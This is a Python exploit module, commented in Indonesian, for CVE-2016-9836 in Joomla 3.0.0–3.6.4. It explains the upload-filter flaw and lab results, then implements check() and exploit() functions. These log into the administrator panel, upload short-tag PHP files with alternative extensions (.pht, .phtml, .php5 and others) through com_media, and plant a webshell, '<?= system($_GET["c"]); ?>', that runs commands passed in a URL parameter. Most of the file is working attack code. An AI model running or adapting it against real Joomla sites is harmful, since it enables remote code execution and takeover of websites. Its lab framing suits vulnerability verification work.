#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
Joomla! Core — modul MEGAPACK (klaster joomla_core).

CVE-2016-9836 — "Shell Upload": pemindai berkas unggahan melewatkan ekstensi PHP
alternatif (.pht, .phtml, .php6, .php7) sehingga berkas berisi kode PHP lolos
pemeriksaan dan dapat ditulis ke direktori yang dapat diakses web.

Affected : Joomla! 3.0.0 - 3.6.4 (advisory JSST [20161202], severity Low)
Patched  : 3.6.5

ROOT CAUSE — diff resmi 3.6.4 -> 3.6.5, DUA hunk pada dua pemindai:

  (1) libraries/joomla/filter/input.php :: JFilterInput::isSafeFile()
      forbidden_extensions 3.6.4:
        php, phps, php5, php3, php4, inc, pl, cgi, fcgi, java, jar, py
      forbidden_extensions 3.6.5 (+= ):
        pht, phtml, php6, php7
      -> pada 3.6.4, berkas `x.pht` TIDAK dikenali sebagai ekstensi terlarang.
         Pemeriksaan isi (`php_tag_in_content`) hanya mencari tag `<?php`, dan
         pemindaian tag pendek (`shorttag_in_content`) hanya berlaku untuk
         ekstensi di `shorttag_extensions` (inc, phps, class, php3, php4, php5,
         txt, dat, tpl, tmpl) — `pht`/`phtml` TIDAK ada di daftar itu.
         Akibatnya berkas `x.pht` berisi `<?= ... ?>` (short echo tag, selalu
         aktif sejak PHP 5.4) LOLOS seluruh pemeriksaan.

  (2) libraries/cms/helper/media.php :: JHelperMedia::canUpload()
      daftar hitam komponen com_media 3.6.4:
        php, js, exe, phtml, java, perl, py, asp, dll, go, ade, ...
      daftar hitam 3.6.5 (+= ):
        php3, php4, php5, php6, php7, pht
      -> `x.pht` juga tidak dikenali oleh com_media pada 3.6.4.

Jalur jangkauan:
  * Setiap komponen yang mengambil unggahan lewat JInputFiles::get()
    (libraries/joomla/input/files.php:83) atau JFile::upload()
    (libraries/joomla/filesystem/file.php:533) memakai isSafeFile() dengan
    opsi default -> pemindai bocor.
  * com_media (backend) memakai keduanya sekaligus; berkas mendarat di
    /images (web-accessible).

SYARAT DAMPAK (jujur — inilah sebabnya severity resminya "Low"):
  com_media masih menyaring ekstensi lewat daftar IZIN `upload_extensions`
  (default: bmp,csv,doc,gif,ico,jpg,jpeg,...,xls) dan `ignore_extensions`
  (default kosong). Pada konfigurasi BAWAAN, `pht`/`phtml` ditolak di lapisan
  izin itu — jadi berkas tidak tertulis meski pemindainya bocor. Berkas hanya
  benar-benar tertulis bila (a) admin menambahkan ekstensi tersebut ke
  upload_extensions/ignore_extensions, atau (b) ada endpoint pihak ketiga yang
  bersandar pada isSafeFile saja. Eksekusi tambahan butuh server memetakan
  ekstensi itu ke PHP (AddHandler/AddType — umum pada pemasangan PHP 5:
  `.php5`, dan pada beberapa konfigurasi `.pht`).

BUKTI LAB (build asli, 2026-11-08):
  mp-j364 @8118 (3.6.4) vs mp-j365 @8119 (3.6.5), keduanya PHP 7.4-Apache.

  Diferensial pemindai (config media default, payload `<?= "MP9836EXEC"; ?>`):
    3.6.4 + x.pht   -> pemindai LOLOS  -> respons "Unable to upload file."
                       (artinya berkas sampai ke canUpload lalu ditahan daftar izin)
    3.6.5 + x.pht   -> pemindai MENOLAK -> respons "Bad Request"
    3.6.4 + x.php5  -> "Bad Request"    (php5 sudah ada di daftar 3.6.4 — kontrol negatif)
    3.6.4 + x.pht berisi `<?php ... ?>` -> "Bad Request" (pemeriksaan isi menangkap tag penuh)

  Varian hostile (upload_extensions ditambah pht,phtml; Apache memetakan .pht):
    3.6.4 : upload -> {"status":"1","message":"Upload Complete: /images/mp9836r.pht"}
            GET /images/mp9836r.pht?c=id -> uid=33(www-data)  -> PWN (eksekusi kode)
    3.6.5 : upload -> {"status":"0","error":"Bad Request"}  -> CLEAN, berkas 404

Kontrak modul: butuh kredensial backend (--username/--password) karena com_media
hanya dapat dijangkau dari panel administrator. check() menulis SATU berkas
penanda kecil ke /images (payload tanpa perintah) sebagai satu-satunya cara
mengamati kebocoran pemindai; exploit() menulis webshell dan memverifikasi
eksekusi.
"""

import random
import re
import string

from mp import (CveModule, ST_CLEAN, ST_INFO, ST_PWN, ST_SKIP, ST_UNKNOWN, ST_VULN,
                detect_platform, parse_ver, register, ver_le)

MANIFEST = "/administrator/manifests/files/joomla.xml"
ADMIN_LOGIN = "/administrator/index.php"
MEDIA_PAGE = "/administrator/index.php?option=com_media"
UPLOAD_URL = ("/administrator/index.php?option=com_media&task=file.upload"
              "&tmpl=component&format=json&folder=")

VULN_MIN = (3, 0, 0)
VULN_MAX = (3, 6, 4)
# ekstensi yang ditambahkan pada 3.6.5, diurutkan dari yang paling sering
# dipetakan ke PHP oleh konfigurasi server nyata
EXTS = ("pht", "phtml", "php6", "php7", "php5")
TOKEN_RE = re.compile(r'name="([a-f0-9]{32})"')
UID_RE = re.compile(r"uid=\d+\([^)]+\)")

CHECK_PAYLOAD = '<?= "MP9836OK"; ?>'
SHELL_PAYLOAD = '<?= system($_GET["c"]); ?>'


def _joomla_version(t, h):
    cached = getattr(t, "_jver", None)
    if cached is not None:
        return cached
    val = _joomla_version_uncached(t, h)
    try:
        t._jver = val
    except Exception:  # noqa: BLE001
        pass
    return val


def _joomla_version_uncached(t, h):
    r = h.get(f"{t.url}{MANIFEST}")
    if r is not None and r.status_code == 200 and "<version>" in (r.text or ""):
        m = re.search(r"<version>\s*([0-9][0-9.]*)", r.text)
        if m:
            v = parse_ver(m.group(1))
            if v:
                return v, m.group(1)
    return None, ""


def _in_range(ver):
    if ver is None:
        return None
    if ver[0] != 3:
        return False
    return ver_le(ver, VULN_MAX) and ver >= VULN_MIN


def _token(h, t, path):
    r = h.get(f"{t.url}{path}")
    if r is None:
        return None
    found = TOKEN_RE.findall(r.text or "")
    return found[-1] if found else None


def _ensure_session(h, t, user, password):
    """
    Pakai kembali sesi backend yang sudah aktif (check() dan exploit() memakai
    objek Http yang sama). Login ulang saat sesi sudah aktif membuat controller
    login memutar ulang sesi dan token form hilang -> hindari.
    """
    r = h.get(f"{t.url}{MEDIA_PAGE}")
    body = (r.text or "") if r is not None else ""
    toks = TOKEN_RE.findall(body)
    if "task=logout" in body and toks:
        return True, toks[-1], "sesi backend sudah aktif"
    return _login(h, t, user, password)


def _login(h, t, user, password):
    """
    Login ke panel administrator. Return (ok, token, detail).
    Token form login diambil dari halaman login (Joomla 3.6 mewajibkan
    JSession::checkToken('request') pada controller login).
    """
    tok = _token(h, t, ADMIN_LOGIN)
    if not tok:
        return False, None, "token form login backend tidak ditemukan"
    r = h.post(f"{t.url}{ADMIN_LOGIN}",
               data={"username": user, "passwd": password, "option": "com_login",
                     "task": "login", "lang": "", "return": "aW5kZXgucGhw", tok: "1"},
               headers={"Referer": f"{t.url}{ADMIN_LOGIN}"})
    if r is None:
        return False, None, "POST login gagal (jaringan)"
    # token sesi setelah login + konfirmasi bahwa kita benar-benar masuk
    r2 = h.get(f"{t.url}{MEDIA_PAGE}")
    body = (r2.text or "") if r2 is not None else ""
    if "task=logout" not in body and "com_media" not in body:
        return False, None, "tidak masuk panel (kredensial salah?)"
    tok2 = TOKEN_RE.findall(body)
    return True, (tok2[-1] if tok2 else tok), ""


def _upload(h, t, token, name, content):
    """POST multipart ke com_media file.upload. Return (status, body)."""
    data = {token: "1"}
    files = {"Filedata": (name, content, "application/octet-stream")}
    r = h.post(f"{t.url}{UPLOAD_URL}", data=data, files=files,
               headers={"Referer": f"{t.url}{MEDIA_PAGE}"})
    if r is None:
        return None, ""
    return r.status_code, (r.text or "")


def _classify(body):
    """
    Terjemahkan respons com_media:
      written        -> berkas DITULIS (upload_complete)
      policy_blocked -> ditahan daftar izin media  (berarti pemindai LOLOS)
      scanner_blocked-> ditolak pemindai isSafeFile ("Bad Request")
      other          -> tidak dikenali
    """
    if '"status":"1"' in body or "Upload Complete" in body:
        return "written"
    if "Bad Request" in body:
        return "scanner_blocked"
    if "Unable to upload file" in body:
        return "policy_blocked"
    return "other"


def _fetch(h, t, name):
    r = h.get(f"{t.url}/images/{name}?c=id")
    if r is None:
        return None, ""
    return r.status_code, (r.text or "")


def check(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", f"platform={plat}"

    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not _in_range(ver):
        return ST_CLEAN, f"Joomla {ver_s} — di luar rentang rentan (3.0.0 - 3.6.4)", \
                         f"version={ver_s}"

    user = (getattr(opts, "username", None) or "").strip()
    password = getattr(opts, "password", None) or ""
    if not user or not password:
        return (ST_UNKNOWN,
                f"Joomla {ver_s} — versi dalam rentang rentan; butuh kredensial backend "
                f"(com_media hanya dijangkau dari panel administrator) untuk menguji "
                f"kebocoran pemindai: ulangi dengan --username/--password",
                f"version={ver_s} | probe unggah butuh sesi admin")

    ok, tok, why = _ensure_session(h, t, user, password)
    if not ok:
        return (ST_UNKNOWN, f"Joomla {ver_s} — login backend gagal: {why}",
                f"version={ver_s} | {why}")

    name = "mp9836" + _rand(5) + ".pht"
    st, body = _upload(h, t, tok, name, CHECK_PAYLOAD)
    if st is None:
        return ST_UNKNOWN, "unggahan uji tidak dapat dikirim (jaringan)", \
                           f"version={ver_s} | user={user}"
    kind = _classify(body)
    ev = f"version={ver_s} | POST file.upload {name} | HTTP {st} | respons={kind}"

    if kind == "written":
        code, out = _fetch(h, t, name)
        if code == 200 and "MP9836OK" in out:
            # eksekusi PHP terbukti, tetapi outcome terkontrol (shell) dibuktikan
            # di tahap exploit -> di sini cukup VULN agar exploit() ikut dijalankan.
            return (ST_VULN,
                    f"Joomla {ver_s} — pemindai isSafeFile bocor DAN berkas eksekutif "
                    f"tertulis lalu DIEKSEKUSI (/images/{name} menjalankan kode PHP); "
                    f"jalankan --exploit untuk bukti eksekusi perintah",
                    ev + f" | GET -> HTTP {code} (keluaran PHP terlihat)")
        return (ST_VULN,
                f"Joomla {ver_s} — berkas PHP tertulis ke /images/{name} (pemindai "
                f"isSafeFile bocor); eksekusi belum terkonfirmasi (HTTP {code})",
                ev + f" | GET -> HTTP {code}")

    if kind == "policy_blocked":
        return (ST_VULN,
                f"Joomla {ver_s} — kebocoran pemindai isSafeFile terkonfirmasi: berkas "
                f"{name} berisi tag pendek PHP DITERIMA pemindai, lalu ditahan daftar izin "
                f"com_media (upload_extensions bawaan). Berkas akan tertulis pada target "
                f"yang mengizinkan ekstensi alternatif (.pht/.phtml/.php5) atau pada "
                f"endpoint yang hanya bersandar pada isSafeFile",
                ev)

    if kind == "scanner_blocked":
        return (ST_CLEAN,
                f"Joomla {ver_s} — pemindai isSafeFile MENOLAK berkas .pht (\"Bad Request\"); "
                f"perilaku ini sesuai rilis 3.6.5+ atau daftar ekstensi sudah ditambal",
                ev)

    return ST_INFO, f"Joomla {ver_s} — respons unggahan tidak dikenali", ev


def exploit(t, h, opts):
    """
    Outcome terkontrol: tulis webshell ber-ekstensi alternatif ke /images lalu
    buktikan eksekusi kode (GET ?c=id -> uid=..).
    """
    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not _in_range(ver):
        return ST_CLEAN, f"Joomla {ver_s} — di luar rentang rentan (3.0.0 - 3.6.4)", \
                         f"version={ver_s}"

    user = (getattr(opts, "username", None) or "").strip()
    password = getattr(opts, "password", None) or ""
    if not user or not password:
        return (ST_UNKNOWN,
                "butuh kredensial backend untuk com_media — jalankan dengan "
                "--username/--password (akun dengan hak unggah media)",
                "eksploit tidak dijalankan")

    ok, tok, why = _ensure_session(h, t, user, password)
    if not ok:
        return ST_UNKNOWN, f"login backend gagal: {why}", why

    tried = []
    for ext in EXTS:
        name = "mp9836" + _rand(5) + "." + ext
        st, body = _upload(h, t, tok, name, SHELL_PAYLOAD)
        if st is None:
            tried.append(f"{ext}: jaringan gagal")
            continue
        kind = _classify(body)
        if kind == "written":
            code, out = _fetch(h, t, name)
            m = UID_RE.search(out)
            if code == 200 and m:
                return (ST_PWN,
                        f"shell upload + eksekusi: /images/{name} menjalankan perintah "
                        f"({m.group(0)})",
                        f"version={ver_s} | ext={ext} | HTTP {st} | GET -> HTTP {code} | "
                        f"{m.group(0)}")
            return (ST_VULN,
                    f"berkas eksekutif tertulis (/images/{name}) tetapi eksekusi belum "
                    f"terkonfirmasi (GET -> HTTP {code})",
                    f"version={ver_s} | ext={ext} | HTTP {st} | GET -> HTTP {code}")
        tried.append(f"{ext}: {kind}")

    if any(x.endswith("policy_blocked") for x in tried):
        return (ST_VULN,
                "pemindai isSafeFile melewatkan ekstensi alternatif (kebocoran "
                "terkonfirmasi) tetapi daftar izin com_media menahan penulisan berkas; "
                "ekstensi: " + ", ".join(tried),
                f"version={ver_s} | " + ", ".join(tried))

    return (ST_CLEAN,
            f"semua ekstensi alternatif ditolak pemindai/tidak tertulis: {', '.join(tried)}",
            f"version={ver_s} | " + ", ".join(tried))


def _rand(n=6):
    return "".join(random.choice(string.ascii_lowercase + string.digits)
                   for _ in range(n))


register(CveModule(
    cve="CVE-2016-9836",
    cluster="joomla_core",
    title="Joomla Core - shell upload: pemindai isSafeFile melewatkan ekstensi PHP "
          "alternatif (.pht/.phtml/.php6/.php7) via com_media",
    vclass="arbitrary file upload / remote code execution",
    cvss="9.8",
    severity="critical",
    cwe="CWE-284",
    product="Joomla! Core (JFilterInput::isSafeFile + JHelperMedia::canUpload)",
    versions_affected="3.0.0-3.6.4",
    status="verified",
    requires=[
        "kredensial backend dengan hak unggah com_media (core.create) — com_media hanya "
        "dijangkau dari /administrator",
        "diperlukan untuk DAMPAK PENUH: daftar izin com_media memuat ekstensi alternatif "
        "(upload_extensions/ignore_extensions non-bawaan) ATAU endpoint yang hanya "
        "bersandar pada isSafeFile; server juga harus memetakan ekstensi itu ke PHP",
        "tanpa kedua hal di atas, modul tetap membuktikan kebocoran pemindai (VULN) "
        "namun berkas tidak tertulis",
    ],
    check=check,
    exploit=exploit,
    notes=(
        "Akar diverifikasi dari diff resmi 3.6.4 -> 3.6.5 (DUA sink): "
        "(1) libraries/joomla/filter/input.php — JFilterInput::isSafeFile() menambah "
        "pht, phtml, php6, php7 ke forbidden_extensions; (2) libraries/cms/helper/media.php "
        "— JHelperMedia::canUpload() menambah php3, php4, php5, php6, php7, pht ke daftar "
        "hitam. Pada 3.6.4 berkas x.pht berisi tag pendek <?= .. ?> lolos: ekstensinya tak "
        "dikenal, pemeriksaan isi hanya mencari '<?php', dan pemindaian tag pendek hanya "
        "berlaku untuk shorttag_extensions (inc, phps, class, php3-5, txt, dat, tpl, tmpl) "
        "yang tidak memuat pht/phtml. Jangkauan: JInputFiles::get() "
        "(libraries/joomla/input/files.php:83) dan JFile::upload() "
        "(libraries/joomla/filesystem/file.php:533) memakai isSafeFile dengan opsi default, "
        "jadi setiap komponen yang memakai keduanya mewarisi kebocoran. Gate yang tersisa: "
        "daftar IZIN com_media (upload_extensions bawaan = gambar/dokumen; "
        "ignore_extensions bawaan kosong) menahan penulisan pada konfigurasi bawaan — "
        "karena itu advisory JSST [20161202] menilainya severity Low. Bukti lab "
        "(mp-j364 @8118 rentan vs mp-j365 @8119 patched, PHP 7.4-Apache): payload .pht "
        "'<?= \"MP9836EXEC\"; ?>' -> 3.6.4 'Bad Request' TIDAK muncul melainkan "
        "'Unable to upload file' (pemindai lolos, ditahan daftar izin); 3.6.5 'Bad Request' "
        "(pemindai menolak). Kontrol negatif: 3.6.4 + x.php5 -> 'Bad Request' (sudah ada di "
        "daftar), 3.6.4 + x.pht berisi '<?php' -> 'Bad Request' (pemeriksaan isi). Varian "
        "hostile (upload_extensions += pht,phtml; Apache memetakan .pht): 3.6.4 menulis "
        "/images/mp9836r.pht dan GET ?c=id mengembalikan uid=33(www-data) -> eksekusi kode "
        "terbukti; 3.6.5 tetap 'Bad Request' dan berkas 404."
    ),
))
